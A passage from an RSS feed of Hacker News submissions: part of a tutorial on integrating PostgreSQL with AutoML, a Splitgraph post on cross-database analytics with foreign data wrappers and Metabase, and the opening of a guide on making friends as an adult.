    <span>cur</span><span>.</span><span>close</span><span>()</span>
<span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
    <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>The code is doing three things:</p>

<ol>
  <li>Create the <code>marketing</code> table if it not exists.</li>
  <li>Split the data into train and test sets (<code>80%/20%</code> split). Datasets are saved to the disk.</li>
  <li>Datasets are inserted into table in the database. The <code>response</code> values is removed from test samples.</li>
</ol>

<p>The data is in the database. Let’s log into PostgreSQL to check:</p>

<div><div><pre><code>&gt; psql -U postgres -d db --host=0.0.0.0 --port=5555 

db=# select count(*) from marketing;
 count 
-------
 40841
(1 row)

db=# select response, count(*) from marketing group by response;
 response | count 
----------+-------
 no       | 28952
          |  8169
 yes      |  3720
(3 rows)
</code></pre></div></div>

<h2 id="lets-train-the-machine-learning-models">Let’s train the Machine Learning models!</h2>

<p>To integrate PostgreSQL with Machine Learning we will need:</p>

<ul>
  <li>method to get training data - <code>get_train_data()</code>,</li>
  <li>method to get live data (for computing predictions) - <code>get_live_data()</code>,</li>
  <li>method to insert predictions into the database - <code>insert_predictions(predictions, ids)</code>,</li>
  <li>method to get predictions (to compute the accuracy) - <code>get_predictions()</code>.</li>
</ul>

<p>I’ve created <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/db.py"><code>db.py</code></a> file to communicate with the database (with <code>psychopg2</code>):</p>

<div><div><pre><code> <span>""" db.py file """</span>
 <span>""" Database API """</span>
<span>import</span> <span>json</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>def</span> <span>db_engine</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>host</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"host"</span><span>]</span>
    <span>port</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"port"</span><span>]</span>
    <span>user</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"user"</span><span>]</span>
    <span># password should be hidden in production setting</span>
    <span># do not store it in config.json</span>
    <span>password</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"password"</span><span>]</span>
    <span>db</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"db"</span><span>]</span>

    <span>return</span> <span>"user='{}' password='{}' host='{}' port='{}' dbname='{}'"</span><span>.</span><span>format</span><span>(</span>
        <span>user</span><span>,</span> <span>password</span><span>,</span> <span>host</span><span>,</span> <span>port</span><span>,</span> <span>db</span>
    <span>)</span>

<span>def</span> <span>sql_to_df</span><span>(</span><span>sql_query</span><span>):</span>
    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>cur</span><span>.</span><span>execute</span><span>(</span><span>sql_query</span><span>)</span>
        <span>df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>(</span><span>cur</span><span>.</span><span>fetchall</span><span>(),</span> <span>columns</span><span>=</span><span>[</span><span>elt</span><span>[</span><span>0</span><span>]</span> <span>for</span> <span>elt</span> <span>in</span> <span>cur</span><span>.</span><span>description</span><span>])</span>
        <span>cur</span><span>.</span><span>close</span><span>()</span>
        <span>return</span> <span>df</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
    
    <span>return</span> <span>None</span>


<span>def</span> <span>get_train_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features+[target])} from {table} where {target} != ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>target</span><span>]</span>
    
    
<span>def</span> <span>get_live_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features + [id_column])} from {table} where {target} = '' and {predicted} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>


<span>def</span> <span>get_predictions</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join([predicted] + [id_column])} from {table} where {target} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>df</span><span>.</span><span>index</span> <span>=</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>
    <span>return</span> <span>df</span>
    
<span>def</span> <span>insert_predictions</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>):</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>

    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>tuples</span> <span>=</span> <span>list</span><span>(</span><span>zip</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>))</span>
        <span>sql_query</span> <span>=</span> <span>f</span><span>"update {table} set {predicted} = </span><span>%</span><span>s where {id_column} = </span><span>%</span><span>s"</span>
        <span>cur</span><span>.</span><span>executemany</span><span>(</span><span>sql_query</span><span>,</span> <span>tuples</span><span>)</span>
        <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>You can see that all information needed to connect and to get data is loaded from <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/config.json"><code>config.json</code></a> file:</p>

<div><div><pre><code>{
    "connection": {
        "host": "0.0.0.0",
        "port": 5555,
        "user": "postgres",
        "password": "1234",
        "db": "db"
    },
    "automl": {
        "table": "marketing",
        "features": [
            "age",
            "job",
            "marital",
            "education",
            "default_payment",
            "balance",
            "housing",
            "loan",
            "day",
            "month",
            "duration",
            "campaign",
            "pdays",
            "previous",
            "poutcome"
        ],
        "target": "response",
        "predicted": "predicted_response",
        "id": "id"
    }
}
</code></pre></div></div>

<ul>
  <li>This file contains connection details (<code>host</code>, <code>port</code>, <code>user</code>, <code>password</code>, <code>db</code>).</li>
  <li>Additionaly, it defines the data source for Machine Learning (<code>table</code> parameter). The <code>features</code> describe the AutoML input, <code>target</code> - the AutoML output, <code>predicted</code> -  the name of the column where predictions will be stored, and <code>id</code> is the index column.</li>
  <li>You can resuse this file to define your own integration of PostgreSQL with AutoML.</li>
  <li>The password is in the config file just for example purposes. In production setting, it should be hidden (as environment variable).</li>
</ul>

<h2 id="lets-train-automl">Let’s train AutoML</h2>

<p>You might find it suprissing but there are only <code>5</code> lines of code in the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/train_automl.py"><code>train_automl.py</code></a> file:</p>

<div><div><pre><code><span>""" train_automl.py file """</span>
<span>from</span> <span>db</span> <span>import</span> <span>get_train_data</span>
<span>from</span> <span>supervised</span> <span>import</span> <span>AutoML</span>

<span># get the training data</span>
<span>X_train</span><span>,</span> <span>y_train</span> <span>=</span> <span>get_train_data</span><span>()</span>
<span># train AutoML</span>
<span>automl</span> <span>=</span> <span>AutoML</span><span>(</span><span>results_path</span><span>=</span><span>"Response_Classifier"</span><span>)</span>
<span>automl</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
</code></pre></div></div>

<p>This code gets data for training from the database and <code>fit()</code> AutoML object. The result of the AutoML are saved in <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier"><code>Response_Classifier</code></a> directory. All models and preprocessing details are <strong>automatically saved</strong> to the hard drive. Additionally, the <code>README.md</code> Markdown reports are created for AutoML and each Machine Learning model. You can check them on GitHub, here are links for few examples:</p>

<ul>
  <li><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier#automl-leaderboard">AutoML leaderboard report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Decision Tree report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/5_Default_Xgboost/README.md">Xgboost report</a>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Best model</th>
      <th>name</th>
      <th>model_type</th>
      <th>metric_type</th>
      <th>metric_value</th>
      <th>train_time</th>
      <th>Link</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>&nbsp;</td>
      <td>1_Baseline</td>
      <td>Baseline</td>
      <td>logloss</td>
      <td>0.354508</td>
      <td>0.32</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/1_Baseline/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>2_DecisionTree</td>
      <td>Decision Tree</td>
      <td>logloss</td>
      <td>0.269144</td>
      <td>15.8</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>3_Linear</td>
      <td>Linear</td>
      <td>logloss</td>
      <td>0.237079</td>
      <td>7.45</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/3_Linear/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>4_Default_R…</td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mljar.com/blog/postgresql-machine-learning/">https://mljar.com/blog/postgresql-machine-learning/</a></em></p>]]>
            </description>
            <link>https://mljar.com/blog/postgresql-machine-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515598</guid>
            <pubDate>Fri, 18 Sep 2020 11:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dogfooding Splitgraph for cross-database analytics in Metabase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515353">thread link</a>) | @mildbyte
<br/>
September 18, 2020 | https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase | <a href="https://web.archive.org/web/*/https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><div><nav><ol><li><a href="#our-analytics-stack" as="#our-analytics-stack">Our analytics stack</a></li><li><a href="#how-to-bring-the-data-together" as="#how-to-bring-the-data-together">How to bring the data together?</a></li><li><a href="#sample-queries" as="#sample-queries">Sample queries</a><ol><li><a href="#federated-join" as="#federated-join">Federated JOIN</a></li></ol></li><li><a href="#data-modelling" as="#data-modelling">Data modelling</a></li><li><a href="#metabase" as="#metabase">Metabase</a><ol><li><a href="#setting-up" as="#setting-up">Setting up</a></li><li><a href="#insights" as="#insights">Insights</a></li></ol></li><li><a href="#conclusion" as="#conclusion">Conclusion</a></li></ol></nav><p><a href="https://www.splitgraph.com/" as="https://www.splitgraph.com">Splitgraph</a> is powered by data. We use <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> to build BI dashboards that can answer questions about how people interact with us. These dashboards reference our Web analytics data, user data and all events happening across the estate. We can find out how many people queried the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> on a given week, how they found Splitgraph, or if they ever pulled a data image.</p><p>This works without any ETL pipelines or a data warehouse. How do we do it?</p><p>Well, we use Splitgraph.</p><p>In this post, we'll talk about our analytics stack. We'll discuss how we use Splitgraph's <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction"><code>sgr mount</code></a> command to proxy to data from Matomo, Elasticsearch and PostgreSQL. We'll show a sample SQL query that runs a federated JOIN between these three databases. Finally, we'll talk about how we use Metabase to get a clear view of the business.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/00-diagram.png"><em>Architecture diagram of our analytics setup.</em></p><section><h2 id="our-analytics-stack">Our analytics stack</h2><p>We hate third-party trackers. At the same time, we would like to know what's happening on the website and across the company in general. In the age of CDNs, a visit to a website might never reach the origin server. HTTP server logs won't show the full story about website visitors.</p><p>To solve that, we started using <strong><a href="https://matomo.org/" as="https://matomo.org/">Matomo</a></strong>. Matomo is an open-source web analytics platform. It offers a similar interface and feature set to Google Analytics. However, unlike GA, it stores all data locally in a MySQL database.</p><p>Besides visiting the website, there's a lot of other ways users can interact with Splitgraph. For example:</p><ul><li>Starring Splitgraph on GitHub or downloading a release</li><li>Querying the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> from an SQL client</li><li>Pushing and pulling <a href="https://splitgraph.com/docs/concepts/images" as="https://splitgraph.com/docs/concepts/images">data images</a> to/from Splitgraph</li><li>Using the <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api" as="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a></li><li>Checking for updates: we use this to estimate the number of active <code>sgr</code> users</li></ul><p>We use <strong>Elasticsearch</strong> to log these and other interesting events.</p><p>Finally, we have a <strong>PostgreSQL</strong> database that stores actual user data. Some of it could be useful to know in an analytics context. For example: a user's primary e-mail address or their GitHub ID.</p></section><section><h2 id="how-to-bring-the-data-together">How to bring the data together?</h2><p>The idea for this setup came to us when we were trying to get some data from the Matomo Web UI. While it is pretty powerful, it's limited in the kinds of reports it can produce. Also, data we'd see in Matomo didn't include anything we store in Elasticsearch.</p><p>We wondered if we could query the data from Matomo's MySQL database directly. The <a href="https://developer.matomo.org/guides/database-schema" as="https://developer.matomo.org/guides/database-schema">schema</a>, albeit complex, is well documented on their website.</p><p>We could ingest data into Elasticsearch. However, we were already using Kibana to visualize Elasticsearch data and its visualizations were sometimes frustrating to use. Basic functionality like plotting sums is only available through scripted Elasticsearch fields.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/01-kibana.png"><em>Pictured: five different visualization engines that Kibana lets you use</em></p><p>But then we thought about it some more. Splitgraph itself is built on top of PostgreSQL. One of its features is making PostgreSQL <a href="https://www.splitgraph.com/blog/foreign-data-wrappers" as="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> more user-friendly. Splitgraph's <code>sgr mount</code> lets you instantiate an FDW with a single command. You can then query the data directly or snapshot it.</p><p>Could we use a Splitgraph instance and add a MySQL FDW to it to query Matomo data?</p><p>And if we did, could we use an Elasticsearch FDW to proxy to our events data?</p><p>And if we did that, could we use something like <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> and point it at Splitgraph, letting it query data across all our data silos?</p><p>Turns out, we could. Here's an abridged version of how we mount Matomo data on a Splitgraph instance. We have a full set of commands on <a href="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics" as="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics">our GitHub</a>.</p><pre><code>sgr mount mysql_fdw matomo_raw -c matomo:$PASSWORD@matomo-db -o@- &lt;&lt;EOF
{
  "remote_schema": "matomo",
  "tables": {
    "matomo_log_action": {
      "hash": "bigint",
      "idaction": "integer",
      "name": "character varying(4096)",
      "type": "smallint",
      "url_prefix": "smallint"
    },
    "matomo_log_visit": {
      "idvisit": "bigint",
      "idvisitor": "bytea",
      "user_id": "character varying(200)",
      "location_ip": "bytea",
      "referer_url": "text",
      "visit_entry_idaction_name": "integer",
      "visit_entry_idaction_url": "integer",
      "visit_exit_idaction_name": "integer",
      "visit_exit_idaction_url": "integer",
      "visit_first_action_time": "timestamp without time zone",
      "visit_last_action_time": "timestamp without time zone",
      "visit_total_actions": "integer",
      "visitor_count_visits": "integer",
      "visitor_days_since_first": "smallint",
      "visitor_days_since_last": "smallint",
      "visitor_returning": "smallint"
    }
  }
}
EOF
</code></pre><p>In this, we just pull out interesting tables and columns from Matomo. The full Matomo schema spec for Splitgraph is available <a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json">here</a>.</p><p>To query Elasticsearch, we used a <a href="https://github.com/splitgraph/postgres-elasticsearch-fdw" as="https://github.com/splitgraph/postgres-elasticsearch-fdw">fork</a> of <code>postgres-elasticsearch-fdw</code> with the ability to push down qualifiers. We made it available as an <code>sgr mount</code> subcommand. Here's an example:</p><pre><code>sgr mount elasticsearch -c elasticsearch:9200 -o@- &lt;&lt;EOF
{
  "table_spec": {
    "github_scraper_data": {
      "schema": {
        "id": "text",
        "@timestamp": "timestamp",
        "sg.github.stars": "integer",
        "sg.github.issues": "integer",
        "sg.github.downloads_installer": "integer",
        "sg.github.downloads_osx": "integer",
        "sg.github.downloads_linux": "integer",
        "sg.github.downloads_windows": "integer"
      },
      "index": "sg-misc*",
      "rowid_column": "id"
    }
  }
}
EOF
</code></pre><p>This creates a table that proxies to the data dumped by our GitHub star scraper.</p><p>Adding our PostgreSQL database was easy. We made an analytics user and gave it access a limited amount of useful tables (we wrote about our <a href="https://www.splitgraph.com/blog/integration-tests" as="https://www.splitgraph.com/blog/integration-tests">configuration and credential generation</a> before):</p><pre><code>sgr mount postgres_fdw sgr_auth -c [connstr] -o@- &lt;&lt;EOF
{
  "dbname": "auth",
  "remote_schema": "sgr_auth",
  "tables": [
    "user_emails",
    "profiles"
  ],
  "extra_server_args": {
    "use_remote_estimate": "true",
    "fetch_size": "10000"
  }
}
EOF
</code></pre></section><section><h2 id="sample-queries">Sample queries</h2><p>Let's now query Elasticsearch from Splitgraph and find out how many GitHub stars Splitgraph has:</p><pre><code metastring=""><span>SELECT</span> <span>"sg.github.stars"</span>
<span>FROM</span> elasticsearch_raw<span>.</span>github_scraper_data
<span>ORDER</span> <span>BY</span> <span>"@timestamp"</span> <span>DESC</span>
<span>LIMIT</span> <span>1</span><span>;</span>

 sg<span>.</span>github<span>.</span>stars

             <span>149</span>
<span>(</span><span>1</span> <span>row</span><span>)</span>
</code></pre><p>Only 149?! Make sure to <a href="https://github.com/splitgraph/splitgraph" as="https://github.com/splitgraph/splitgraph">star Splitgraph on GitHub</a> if you're reading this!</p><section><h3 id="federated-join">Federated JOIN</h3><p>As a real-world example, let's say we wanted to:</p><ul><li>Find users that visited our website in the last week</li><li>Also find out how many queries to our Data Delivery Network they made</li><li>Find out their e-mail addresses</li></ul><p>This data lives across three different databases, as discussed. With this setup, we can bring these three silos together with one simple SQL query:</p><pre><code metastring=""><span>SELECT</span>
    v<span>.</span>user_id<span>,</span>
    email<span>,</span>
    last_visit<span>,</span>
    <span>COALESCE</span><span>(</span>total_ddn_queries<span>,</span> <span>0</span><span>)</span> <span>AS</span> total_ddn_queries
<span>FROM</span> sgr_auth<span>.</span>user_emails ue
<span>LEFT</span> <span>OUTER</span> <span>JOIN</span> <span>(</span>
    
    <span>SELECT</span> <span>"sg.api.user_id"</span> <span>AS</span> user_id<span>,</span> <span>COUNT</span><span>(</span><span>1</span><span>)</span> <span>AS</span> total_ddn_queries
    <span>FROM</span> elasticsearch_raw<span>.</span>sql_api_queries
    <span>WHERE</span> <span>"sg.sql.used_images"</span> <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> d
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> d<span>.</span>user_id
<span>JOIN</span> <span>(</span>
    
    
    <span>SELECT</span> user_id<span>,</span> <span>MAX</span><span>(</span>visit_last_action_time<span>)</span> <span>AS</span> last_visit
    <span>FROM</span> matomo_raw<span>.</span>matomo_log_visit v
    <span>WHERE</span> user_id <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>AND</span> AGE<span>(</span>visit_last_action_time<span>)</span> <span>&lt;</span> <span>'1 week'</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> v
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> v<span>.</span>user_id
<span>WHERE</span> ue<span>.</span>is_primary <span>IS</span> <span>TRUE</span>
<span>ORDER</span> <span>BY</span> last_visit <span>DESC</span><span>;</span>
</code></pre><p>Here's the query plan for it:</p><pre><code> Sort
   Sort Key: (max(v.visit_last_action_time)) DESC
   -&gt;  Hash Left Join
         Hash Cond: ((ue.user_id)::text = d.user_id)
         -&gt;  Hash Join
               Hash Cond: ((ue.user_id)::text = (v.user_id)::text)
               -&gt;  Foreign Scan on user_emails ue
                     Filter: (is_primary IS TRUE)
               -&gt;  Hash
                     -&gt;  HashAggregate
                           Group Key: v.user_id
                           -&gt;  Foreign Scan on matomo_log_visit v
                                 Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)
         -&gt;  Hash
               -&gt;  Subquery Scan on d
                     -&gt;  GroupAggregate
                           Group Key: sql_api_queries."sg.api.user_id"
                           -&gt;  Sort
                                 Sort Key: sql_api_queries."sg.api.user_id"
                                 -&gt;  Foreign Scan on sql_api_queries
                                       Filter: ("sg.sql.used_images" IS NOT NULL)
                                       Multicorn: Elasticsearch query to &lt;Elasticsearch([{'host': 'elasticsearch', 'port': 9200}])&gt;
                                       Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>As you can see, this resolves into a Hash Join across three foreign tables. It also pushes down most of the clauses to the three origin databases:</p><pre><code>[PostgreSQL]
Foreign Scan on user_emails ue
  Filter: (is_primary IS TRUE)

[MySQL]
Foreign Scan on matomo_log_visit v
  Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)

[Elasticsearch]
-&gt;  Foreign Scan on sql_api_queries
  Filter: ("sg.sql.used_images" IS NOT NULL)
  Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>Normally, this would require a data warehouse and a few separate ingestion pipelines. With Splitgraph and PostgreSQL, we can query the data at source. This idea is called "data virtualization" or a "data fabric". We call it a "database proxy".</p><p>Is data virtualization always the right solution? No, but it should be a starting point. If performance becomes a concern, we'll be able to snapshot these tables as Splitgraph images. Splitgraph stores data in a columnar format (using
<a href="https://www.splitgraph.com/docs/concepts/objects" as="https://www.splitgraph.com/docs/concepts/objects"><code>cstore_fdw</code></a>), so we'll be able to query it much faster.</p></section></section><section><h2 id="data-modelling">Data modelling</h2><p>We wrote a few views on these source foreign tables that wrangle the data and clean it up. For example (<a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql">SQL on GitHub</a>),…</p></section></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</a></em></p>]]>
            </description>
            <link>https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515353</guid>
            <pubDate>Fri, 18 Sep 2020 11:20:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Make Friends as an Adult]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24515221">thread link</a>) | @Parth86
<br/>
September 18, 2020 | https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Friends are a treasure. In an uncertain world, they provide a comforting sense of stability and connection. We laugh together and cry together, sharing our good times and supporting each other through the bad. Yet a defining feature of friendship is that itâ€™s voluntary. Weâ€™re not wedded together by law, or through blood, or via monthly payments into our bank accounts. It is a relationship of great freedom, one that we retain only because we want to.</p>
<p>But the downside of all this freedom, this lack of formal commitment, is that friendship often falls by the wayside. Our adult lives can become a monsoon of obligations, from children, to partners, to ailing parents, to work hours that trespass on our free time. A <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Febs0000046">study</a> of young adultsâ€™ social networks by researchers at the University of Oxford found that those in a romantic relationship had, on average, two fewer close social ties, including friends. Those with kids had lost out even more. Friendships crumble, not because of any deliberate decision to let them go, but because we have other priorities, ones that arenâ€™t quite as voluntary. The title of the Oxford paper summed up things well: â€˜Romance and Reproduction Are Socially Costlyâ€™.</p>
<p>Such is the pace and busyness of many peopleâ€™s adult lives that they can lose contact with their friends at a rapid rate. For instance, a <a href="https://www.sciencedirect.com/science/article/pii/S0378873313001056?via%3Dihub">study</a> by the Dutch sociologist Gerald Mollenhorst found that, over a period of seven years, people had lost touch with half of their closest friends, on average. Whatâ€™s especially alarming is that many of us seem to be losing friends faster than we can replace them. A <a href="https://psycnet.apa.org/record/2012-13785-001">meta-analysis</a> by researchers in Germany published in 2013 combined data from 177,635 participants across 277 studies, concluding that friendship networks had been shrinking for the preceding 35 years. For example, in studies conducted between 1980 and 1985, participants reportedly had four more friends on average, compared with the participants whoâ€™d taken part in studies between 2000 and 2005.</p>
